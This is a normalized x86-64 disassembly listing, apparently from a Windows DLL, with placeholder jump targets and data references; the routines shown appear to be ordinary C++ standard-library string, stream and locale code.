call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r13w ax
jne r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] si
movzx eax si
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] si
movzx eax si
jmp r-xdata
cmp r13w ax
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_180008240
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x10 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] al
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180006fe0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180008290
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x20 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] ax
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_1800023b0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_1800082e0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x28 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] ax
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_1800023b0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180008330
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rcx
mov ebx edx
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
call j_sub_180018b3c#2
mov rcx [ rdi + 0x20 ]
call j_sub_180018b3c#2
mov rcx [ rdi + 0x28 ]
call j_sub_180018b3c#2
lea r11 [ r--data ]
mov [ rdi ] r11
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180008390
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x10
jb r-xdata
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rbp ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
cmp r9 0x10
jb r-xdata
cmp rdx rax
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
add rcx [ rbx + 0x10 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_1800029e0
test rdi rdi
je r-xdata
cmp r9 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] 0x0
jmp r-xdata
mov rax [ rbx ]
mov [ rax ] dil
jmp r-xdata
sub rsi rax
mov r9 r8
mov rdx rbx
mov r8 rsi
mov rcx rbx
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
jmp sub_1800088f0
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx [ rbx + 0x10 ]
mov r8 rbp
mov rdx rsi
call sub_180018670
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_1800084d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rdx + 0x10 ]
mov rbp r8
mov rsi rdx
mov rbx rcx
cmp rdi r8
jae r-xdata
sub rdi r8
cmp r9 rdi
cmovb rdi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_180016ebc
cmp rdi 0xfffffffffffffffe
jbe r-xdata
lea rdx [ rdi + r8 ]
or r8 0xffffffffffffffff
call sub_180008a10
mov r8 rbp
xor edx edx
mov rcx rbx
call sub_180008a10
jmp r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test rdi rdi
jne r-xdata
mov r8 [ rcx + 0x10 ]
mov rdx rdi
call sub_1800029e0
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rdx [ rsi + rbp ]
mov r8 rdi
call sub_180018670
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_1800085e0
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
mov rbx [ rsp + 0x80 ]
mov rdi r9
mov rsi r8
mov rbp rdx
test rbx rbx
je r-xdata
mov rax [ rsi ]
mov [ rbp ] rax
mov rax [ rsi + 0x8 ]
mov [ rbp + 0x8 ] rax
mov rax rbp
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x78 ] r13
mov [ rsp + 0x30 ] r14
xor r14d r14d
lea r12 [ rcx + 0x10 ]
mov r13d 0xffff
nop
mov [ rsi ] 0x1
mov rax [ rcx + 0x48 ]
movzx r8d [ rsp + 0x68 ]
cmp [ rax ] r14
je r-xdata
movzx eax [ rdi ]
lea r9 [ rsp + 0x70 ]
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x68 ]
mov r8d 0x1
mov [ rsp + 0x68 ] r14w
mov [ rsp + 0x80 ] al
mov [ rsp + 0x70 ] r14d
mov [ rsp + 0x20 ] r12
call sub_180017a9c
mov rcx [ rsi + 0x8 ]
test rcx rcx
je r-xdata
mov r14 [ rsp + 0x30 ]
mov r13 [ rsp + 0x78 ]
mov r12 [ rsp + 0x60 ]
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] r14d
jle r-xdata
inc rdi
dec rbx
jne r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r13w r8w
jne r-xdata
sub_1800086e0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x78
movzx r15d [ rsp + 0xe8 ]
mov r13 [ rsp + 0xe0 ]
movaps [ rsp + 0x60 ] xmm6
mov r12 r9
mov rdi r8
mov r14 rcx
nop
mov rbp r13
sub rbp r12
jmp r-xdata
mov rdi [ rsp + 0xd0 ]
add r12 rbp
sub r13 rbp
movups [ rdi ] xmm6
je r-xdata
add r14 0x10
mov r15d 0xffff
xor r13d r13d
nop [ rax + rax ] ax
movups xmm6 [ rdi ]
mov rsi r12
mov rdi rbp
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
test rbp rbp
je r-xdata
mov rax [ rsp + 0xc8 ]
movups [ rax ] xmm6
movaps xmm6 [ rsp + 0x60 ]
add rsp 0x78
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
test r15w r15w
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
movzx r8d [ rsp + 0x30 ]
cmp [ rax ] r13
je r-xdata
inc r12
dec r13
mov [ rsp + 0xe0 ] r13
jmp r-xdata
movaps [ rsp + 0x50 ] xmm6
test rbx rbx
je r-xdata
movzx eax [ rsi ]
lea r9 [ rsp + 0x34 ]
lea rdx [ rsp + 0xd8 ]
lea rcx [ rsp + 0x30 ]
mov r8d 0x1
mov [ rsp + 0x30 ] r13w
mov [ rsp + 0xd8 ] al
mov [ rsp + 0x34 ] r13d
mov [ rsp + 0x20 ] r14
call sub_180017a9c
test rbx rbx
je r-xdata
mov r13 [ rsp + 0xe0 ]
movzx r15d [ rsp + 0xe8 ]
movaps xmm6 [ rsp + 0x40 ]
mov r14 [ rsp + 0xc0 ]
mov rax [ rbx ]
movzx edx r8w
mov rcx rbx
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] r13d
jle r-xdata
mov r8 r13
xor edx edx
mov rcx r12
call sub_180018bf4
mov rbp rax
test rax rax
je r-xdata
mov [ rsp + 0x50 ] 0x1
movaps xmm6 [ rsp + 0x50 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
inc rsi
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r15w r8w
jne r-xdata
movups [ rdi ] xmm6
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_1800088f0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
sub rax r8
mov r8 [ rcx + 0x10 ]
cmp rax r9
cmovb rbp rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
lea rcx [ r--data ]
call sub_180016ebc
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rbp ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_1800029e0
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx [ rbx + 0x10 ]
lea rdx [ rsi + r12 ]
mov r8 rbp
call sub_180018670
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_180008a10
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_180016ebc
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov rax rbx
mov rcx [ rcx ]
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + r11 ] 0x0
mov rax [ rbx ]
mov [ rax + r11 ] 0x0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rdx rcx
lea rcx [ rax + r9 ]
sub r8 rdi
add rdx rdi
call sub_180018670
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] r11
jb r-xdata
sub_180008ab0
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov [ rsp + 0x88 ] rsi
mov r15 rdx
mov rsi rcx
xor ebx ebx
mov [ rsp + 0x80 ] ebx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r13 [ rcx - 0x1 ]
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rdi [ rcx + rsi + 0x28 ]
test rdi rdi
jle r-xdata
xor edi edi
cmp rdi r13
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub rdi r13
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rsi + 0x50 ]
test rcx rcx
je r-xdata
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov rcx [ rcx + rsi + 0x48 ]
test rcx rcx
je r-xdata
mov eax [ rcx + rsi + 0x18 ]
and eax 0x1c0
mov r12d 0xffff
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
call sub_180003da0
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
mov r8 r13
mov rdx r15
call [ rax + 0x48 ]
cmp rax r13
je r-xdata
test rdi rdi
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
test rdi rdi
jle r-xdata
mov ebx 0x4
jmp r-xdata
test ebx ebx
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rsi + 0x28 ] 0x0
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x80 ] ebx
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ r14 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r14 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r14
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
dec rdi
jmp r-xdata
or ebx 0x4
mov [ rsp + 0x80 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov rax rsi
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x88 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
dec rdi
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r12w r8w
jne r-xdata
cmp r12w r8w
jne r-xdata
sub_180008d10
mov rax rsp
mov [ rax + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rsi
movzx r14d dx
mov rdi rcx
xor ebx ebx
mov [ rsp + 0x80 ] ebx
mov r15 rcx
mov [ rax - 0x40 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rdi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rdi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
je r-xdata
mov rcx [ rcx + rdi + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rdi + 0x28 ] 0x0
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rsi [ rcx + rdi + 0x28 ]
cmp rsi 0x1
jg r-xdata
call sub_180003da0
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
dec rsi
xor esi esi
jmp r-xdata
mov rax [ r15 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r15 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r15
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ rcx + rdi + 0x18 ]
and eax 0x1c0
mov r12d 0x4
mov r13d 0xffff
cmp eax 0x40
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x88 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rcx ]
movzx edx r14w
call [ rax + 0x18 ]
movzx r14d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
jmp r-xdata
test rsi rsi
jle r-xdata
test rsi rsi
jle r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r14w
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rdi + 0x58 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rdi + 0x58 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
cmp r13w r14w
cmove ebx r12d
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] ebx
jle r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] ebx
jle r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov [ rsp + 0x80 ] ebx
test ebx ebx
jne r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r13w r8w
cmove ebx r12d
mov [ rsp + 0x80 ] ebx
dec rsi
jmp r-xdata
cmp r13w r8w
cmove ebx r12d
dec rsi
jmp r-xdata
sub_180008f80
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_18001775c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_180017388
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_18001778c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_180009220
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180018598
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
int3
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rcx rbx
call sub_1800172b8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_1800090d0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_18001775c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_180017388
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_18001778c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_1800093a0
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180018598
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
int3
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rcx rbx
call sub_1800172b8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_180009220
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x37 ]
sub rsp 0x90
mov [ rbp - 0x39 ] 0xfffffffffffffffe
mov [ rsp + 0xc8 ] rbx
mov r12 rdx
mov rsi rcx
xor r13d r13d
mov edi r13d
mov [ rbp + 0x67 ] r13d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
mov rbx [ rsp + 0xc8 ]
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea ecx [ r13 + 0x18 ]
call sub_180018a08
mov rbx rax
mov [ rbp + 0x77 ] rax
test rax rax
je r-xdata
mov rbx r13
mov rax [ r12 ]
mov rdi [ rax + 0x28 ]
test rdi rdi
jne r-xdata
lea rcx [ rbp - 0x19 ]
call sub_180017470
nop
mov rcx [ rbp + 0x1f ]
test rcx rcx
je r-xdata
xor edx edx
lea rcx [ rbp - 0x19 ]
call sub_18001775c
nop
mov [ rbp - 0x11 ] r13
mov [ rbp - 0x9 ] 0x0
mov [ rbp - 0x1 ] r13
mov [ rbp + 0x7 ] 0x0
mov [ rbp + 0xf ] r13
mov [ rbp + 0x17 ] 0x0
mov [ rbp + 0x1f ] r13
mov [ rbp + 0x27 ] 0x0
test rdi rdi
jne r-xdata
lea rdi [ rax + 0x30 ]
mov [ rbp + 0x1f ] r13
mov rcx [ rbp + 0xf ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rdx rdi
lea rcx [ rbp - 0x19 ]
call sub_180017504
nop
mov edi 0x1
mov [ rbx + 0x8 ] r13
lea rax [ r--data ]
mov [ rbx ] rax
call sub_18001700c
mov [ rbx + 0x10 ] rax
jmp r-xdata
lea rax [ r--data ]
mov [ rbp + 0x67 ] rax
lea rdx [ rbp + 0x67 ]
lea rcx [ rbp - 0x31 ]
call sub_180018524
lea r11 [ r--data ]
mov [ rbp - 0x31 ] r11
lea rdx [ r--data ]
lea rcx [ rbp - 0x31 ]
call sub_180019410
int3
mov [ rbp + 0xf ] r13
mov rcx [ rbp - 0x1 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rbp - 0x1 ] r13
mov rcx [ rbp - 0x11 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rbp - 0x11 ] r13
lea rcx [ rbp - 0x19 ]
call sub_18001778c
call sub_180018b3c
sub_1800093a0
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x37 ]
sub rsp 0x90
mov [ rbp - 0x39 ] 0xfffffffffffffffe
mov [ rsp + 0xc8 ] rbx
mov r12 rdx
mov rsi rcx
xor r13d r13d
mov edi r13d
mov [ rbp + 0x67 ] r13d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
mov rbx [ rsp + 0xc8 ]
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea ecx [ r13 + 0x30 ]
call sub_180018a08
mov rbx rax
mov [ rbp + 0x77 ] rax
test rax rax
je r-xdata
mov rbx r13
mov rax [ r12 ]
mov rdi [ rax + 0x28 ]
test rdi rdi
jne r-xdata
lea rcx [ rbp - 0x19 ]
call sub_180017470
nop
mov rcx [ rbp + 0x1f ]
test rcx rcx
